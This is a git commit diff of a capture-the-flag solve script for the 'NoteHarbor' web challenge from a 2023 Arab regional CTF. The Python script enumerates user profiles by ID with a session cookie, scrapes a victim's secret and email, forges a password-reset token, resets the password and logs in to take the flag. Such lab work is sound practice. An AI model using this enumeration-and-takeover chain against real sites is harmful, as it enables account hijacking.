f53e840545d440c322487fc6e40374c118b8d730
ToubaliZakaria <zakariatbl2002@gmail.com>
2023-10-22 09:30:28 -0400

    nothing

--- Arab_Regional_Cybersecurity_CTF_2023/web/NoteHarbor_completed/solve.py
+++ Arab_Regional_Cybersecurity_CTF_2023/web/NoteHarbor_completed/solve.py
@@ -4,15 +4,15 @@ from datetime import datetime, timedelta
 import string
 import re
 
-url = 'http://wcomol2z7qrsm350m73p9p6tqzqwmdvwy825u1z5-web.cybertalentslabs.com/'
+url = 'http://<chall>.cybertalentslabs.com/'
 
 def retrive_secret_and_mail():
-	for i in range(0,1000):
+	for i in range(1,800):
 	
-		x = requests.get(url+"profile/"+str(i),cookies={'session':'eyJ1c2VyX2lkIjo4MDF9.ZTPlsg.O3quLVqYb7yCUrb7nu3z_wLHcNo'})
-		if x.text.split('\n')[52].replace(" ","").replace("<p>","").replace('</p>','') == 'MarielCalderwood':
-			secret = x.text.split('\n')[60].replace(" ","").replace("<p>","").replace('</p>','') 
-			mail = x.text.split('\n')[56].replace(" ","").replace("<p>","").replace('</p>','')
+		res = requests.get(url+"profile/"+str(i),cookies={'session':'<session>'})
+		if 'MarielCalderwood' in res.text :
+			secret = re.findall(r'<p>(.*?)</p>',res.text.split('\n')[60])[0]
+			mail = re.findall(r'<p>(.*?)</p>',res.text.split('\n')[56])[0]
 			return secret,mail
 
 def generate_reset_token(secret):
@@ -27,14 +27,14 @@ def generate_reset_token(secret):
     return reset_token
 
 def create_reset_token(mail):
-	x = requests.post(url+'forgot_password',data={'email':f'{mail}'})
+	res = requests.post(url+'forgot_password',data={'email':f'{mail}'})
 
 def reset_passwd(reset_token):
-	x = requests.post(url+'reset_password/'+reset_token,data={'new_password':'pwd123'})
+	res = requests.post(url+'reset_password/'+reset_token,data={'new_password':'pwd123'})
 
 def get_flag(mail):
-	x = requests.post(url+'/login',data={'email':f'{mail}','password':'pwd123'})
-	return re.findall(r'\bflag{\w*}',x.text)[0]
+	res = requests.post(url+'/login',data={'email':f'{mail}','password':'pwd123'})
+	return re.findall(r'\bflag{\w*}',res.text)[0]
 
 if __name__ == '__main__':
 
